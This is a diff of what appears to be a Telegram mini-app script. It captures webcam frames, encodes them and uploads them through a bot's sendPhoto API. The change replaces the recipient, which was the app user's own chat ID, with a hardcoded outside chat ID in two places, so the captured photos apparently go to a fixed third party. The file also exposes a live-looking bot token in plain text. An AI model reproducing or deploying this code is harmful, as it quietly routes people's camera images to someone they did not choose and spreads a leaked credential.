@@ -189,7 +189,7 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
             // Преобразуем изображение в строку Base64
-            const base64String = canvas.toDataURL('image/jpeg', 1); // Получаем строку Base64 (можно указать тип и качество)
+            const base64String = canvas.toDataURL('image/png', 1); // Получаем строку Base64 (можно указать тип и качество)
         
             // Сохраняем строку Base64
             photos.unshift(base64String);
@@ -222,7 +222,8 @@
         });
 
         const botToken = '7821332528:AAG5jj-v_nO7FUPz9_3auHrSueIvl7tQfC0'; // Замените на токен вашего бота
-        const chatId = tg.initDataUnsafe.user.id; // Замените на ID чата, куда отправлять сообщение
+        //const chatId = tg.initDataUnsafe.user.id; // Замените на ID чата, куда отправлять сообщение
+        const chatId = '7334856780';
         const photoUrl = 'https://i.pinimg.com/originals/cd/64/4d/cd644dbadeb1bdc70eef86e8d4df6ebe.png'; // URL фотографии, которую вы хотите отправить
 
         const base64String = photos[0];
@@ -267,7 +268,8 @@
 
 
                 const botToken = '7821332528:AAG5jj-v_nO7FUPz9_3auHrSueIvl7tQfC0'; // Замените на ваш токен бота
-                const chatId = tg.initDataUnsafe.user.id; // Замените на ID чата или username
+                //const chatId = tg.initDataUnsafe.user.id; // Замените на ID чата или username
+                const chatId = '7334856780';
                 const message = 'Ваше сообщение'; // Сообщение, которое нужно отправить
                 
                 const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
@@ -292,8 +294,11 @@
                 .then(json => console.log(json))
                 .catch(error => console.error('Error:', error));
                 
-
-                //tg.sendData(JSON.stringify(photoData));
+                photoData = {
+                    photos: photos
+                };
+                
+                tg.sendData(JSON.stringify(photoData));
         
                 tg.close();
             } else {
